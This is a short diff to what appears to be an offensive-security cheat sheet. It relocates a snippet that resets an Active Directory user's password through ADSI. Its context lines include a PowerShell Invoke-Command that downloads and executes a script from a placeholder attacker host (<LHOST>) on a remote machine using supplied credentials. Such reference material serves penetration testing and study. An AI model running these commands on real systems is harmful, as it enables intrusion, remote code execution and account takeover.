@@ -7779,14 +7779,6 @@ $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First
 $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
 ```
 
-##### Set User Password via Active Directory Service Interfaces (ADSI)
-
-```cmd
-$user = [adsi]"LDAP://CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>"
-$user.SetPassword('<PASSWORD>')
-$user.SetInfo()
-```
-
 ##### Switching Sessions in PowerShell
 
 ```cmd
@@ -7840,6 +7832,14 @@ Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -creden
 $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
 Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
+```
+
+##### Set User Password via Active Directory Service Interfaces (ADSI)
+
+```cmd
+$user = [adsi]"LDAP://CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>"
+$user.SetPassword('<PASSWORD>')
+$user.SetInfo()
 ```
 
 #### PrivescCheck
